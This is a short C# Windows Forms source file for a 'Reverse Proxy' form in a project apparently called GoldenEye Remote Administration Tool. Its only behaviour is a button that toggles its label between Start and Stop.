using System;
using System.Windows.Forms;

namespace GoldenEye_Remote_Administration_Tool.Forms
{
    public partial class Reverse_Proxy : Form
    {
        public Connection client;

        public Reverse_Proxy()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (button1.Text.Equals("Start"))
            {
                button1.Text = "Stop";
            }
            else
            {
                button1.Text = "Start";
            }
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }
    }
}